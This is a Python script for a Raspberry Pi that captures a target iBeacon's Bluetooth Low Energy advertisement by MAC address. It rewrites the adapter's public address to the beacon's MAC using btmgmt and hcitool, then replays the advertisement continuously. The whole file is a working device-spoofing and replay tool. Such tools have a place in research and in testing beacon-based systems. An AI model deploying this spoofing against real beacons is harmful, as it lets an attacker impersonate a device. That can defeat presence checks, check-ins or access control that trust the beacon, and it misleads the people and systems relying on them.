#!/usr/bin/env python3
"""
ibeacon_replay.py

replaying without calculate a advertise ms

Capture an iBeacon’s advertisement from live BLE traffic and replay it continuously
using the Raspberry Pi’s Bluetooth adapter — now spoofing the beacon’s **public** address.

Usage:
    sudo python3 ibeacon_replay.py --mac C3:00:00:3D:D1:F7 [--timeout 10]

Requirements:
    - Python 3
    - bleak (`pip install bleak`)
    - BlueZ (`sudo apt install bluez bluetooth`)
    - Run as root (sudo) to allow HCI and mgmt commands
"""

import asyncio
import argparse
import os
import sys
import subprocess
from bleak import BleakScanner

# ---------- BLE scanning via Bleak ----------

async def capture_ibeacon(target_mac: str, timeout: int):
    """
    Scan for BLE advertisements up to `timeout` seconds.
    Return a dict with:
      - manufacturer_data: {company_id: bytes}
      - service_data:     {uuid_str: bytes}
      - local_name:       str or None
      - tx_power:         int or None
    """
    result = {}
    stop_event = asyncio.Event()

    def detection_callback(device, adv_data):
        if device.address.lower() == target_mac.lower() and adv_data.manufacturer_data:
            result['manufacturer_data'] = adv_data.manufacturer_data
            result['service_data']     = adv_data.service_data
            result['local_name']       = adv_data.local_name
            result['tx_power']         = adv_data.tx_power
            stop_event.set()

    scanner = BleakScanner(detection_callback, scanning_mode="active")
    await scanner.start()
    try:
        await asyncio.wait_for(stop_event.wait(), timeout)
    except asyncio.TimeoutError:
        pass
    finally:
        await scanner.stop()

    return result

# ---------- Build AD structures ----------

def build_adv_bytes(manufacturer_data: dict) -> bytes:
    """
    Build the Flags + Manufacturer AD structure from manufacturer_data.
    """
    # Flags: length=2, type=0x01, data=0x06 (LE General Discoverable + BR/EDR Not Supported)
    flags_struct = b"\x02\x01\x06"

    comp_id, payload = next(iter(manufacturer_data.items()))
    comp_bytes = comp_id.to_bytes(2, byteorder='little')
    manu_struct = bytes([len(payload) + len(comp_bytes) + 1, 0xFF]) + comp_bytes + payload

    return flags_struct + manu_struct

def build_scan_resp_bytes(service_data: dict, local_name: str, tx_power: int) -> bytes:
    """
    Build scan response AD structures for:
      - Complete List of 16-bit Service Class UUIDs (0x03)
      - Service Data 16-bit UUIDs (0x16)
      - Tx Power Level (0x0A)
      - Complete Local Name (0x09)
    """
    import re
    parts = []

    # 1) Complete List of 16-bit Service Class UUIDs (AD type 0x03)
    for uuid_str in service_data.keys():
        m16 = re.fullmatch(r"[0-9A-Fa-f]{4}", uuid_str)
        m128 = re.fullmatch(r"0000([0-9A-Fa-f]{4})-0000-1000-8000-00805f9b34fb", uuid_str)
        if m16 or m128:
            hex16 = m16.group(0) if m16 else m128.group(1)
            val = int(hex16, 16)
            parts.append(bytes([3, 0x03, val & 0xFF, (val >> 8) & 0xFF]))

    # 2) Service Data (AD type 0x16)
    for uuid_str, data_bytes in service_data.items():
        m128 = re.fullmatch(r"0000([0-9A-Fa-f]{4})-0000-1000-8000-00805f9b34fb", uuid_str)
        m16  = re.fullmatch(r"[0-9A-Fa-f]{4}", uuid_str)
        if m16 or m128:
            hex16 = m16.group(0) if m16 else m128.group(1)
            val = int(hex16, 16)
            uuid_le = val.to_bytes(2, byteorder='little')
            length = 1 + len(uuid_le) + len(data_bytes)
            parts.append(bytes([length, 0x16]) + uuid_le + data_bytes)

    # 3) Tx Power Level (0x0A)
    if tx_power is not None:
        parts.append(bytes([0x02, 0x0A, tx_power & 0xFF]))

    # 4) Complete Local Name (0x09)
    if local_name:
        nb = local_name.encode('utf-8')
        parts.append(bytes([len(nb) + 1, 0x09]) + nb)

    return b"".join(parts)

# ---------- Main Script ----------

def main():
    # turn on bt capture
    subprocess.run(["hciconfig","hci0","up"],check=True)
    
    parser = argparse.ArgumentParser(description="Capture & replay an iBeacon on Raspberry Pi (public-addr spoof)")
    parser.add_argument("--mac", "-m", required=True,
                        help="Target iBeacon MAC address (e.g. C3:00:00:3D:D1:F7)")
    parser.add_argument("--timeout", "-t", type=int, default=10,
                        help="Scan timeout in seconds")
    args = parser.parse_args()
    target_mac = args.mac.upper()
    timeout = args.timeout

    if os.geteuid() != 0:
        sys.exit("Error: this script requires root privileges. Please run with sudo.")

    print(f"[*] Scanning for iBeacon {target_mac} for up to {timeout}s…")
    adv = asyncio.run(capture_ibeacon(target_mac, timeout))

    if not adv.get('manufacturer_data'):
        sys.exit(f"[!] ERROR: No advertisement found for {target_mac} within {timeout}s")

    manuf = adv['manufacturer_data']
    svc   = adv.get('service_data', {})
    name  = adv.get('local_name')
    tx    = adv.get('tx_power')

    adv_bytes       = build_adv_bytes(manuf)
    scan_resp_bytes = build_scan_resp_bytes(svc, name, tx)

    print("[*] Captured Advertisement:")
    print("    Manufacturer Data:", manuf)
    print("    Service Data      :", svc)
    print("    Local Name        :", name)
    print("    Tx Power          :", tx)
    print("    ADV payload (hex) :", adv_bytes.hex())
    if scan_resp_bytes:
        print("    ScanResp payload  :", scan_resp_bytes.hex())

    # 1) disable any existing LE advertising
    subprocess.run(["hcitool","-i","hci0","cmd","0x08","0x000A","00"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 2) rewrite public address
    print(f"[*] Setting public-addr to {target_mac}…")
    subprocess.run(["btmgmt","--index","0","power","off"],check=True)
    subprocess.run(["btmgmt","--index","0","public-addr",target_mac],check=True)
    subprocess.run(["btmgmt","--index","0","power","on"],check=True)
    subprocess.run(["systemctl","restart","bluetooth"],check=True)

    # 3) ensure interface is up and unblocked
    subprocess.run(["hciconfig","hci0","up"],check=True)
    subprocess.run(["rfkill","unblock","bluetooth"],check=True)

    # Start the advertisement
    cmd = ["btmgmt", "--index", "0", "add-adv", "-c", "-d", adv_bytes.hex()]
    if scan_resp_bytes:
        cmd += ["-s", scan_resp_bytes.hex()]
    cmd.append("1")
    print(" ".join(cmd))
    print("[*] Adding advertisement instance…")
    res = subprocess.run(cmd, capture_output=True, text=True)
    if res.returncode != 0:
        print("[!] Failed to start advertising:")
        print(res.stderr.strip() or res.stdout.strip())
        sys.exit(1)
    # 5) explicitly enable LE advertising via HCI
    print("[*] Enabling advertising…")
    subprocess.run(["hcitool","-i","hci0","cmd","0x08","0x000A","01"],check=True)
    
    print(f"[+] iBeacon replay started—advertising as {target_mac}.")
    print("    Press Ctrl+C to exit (advertising will continue until removed).")

if __name__ == "__main__":
    main()

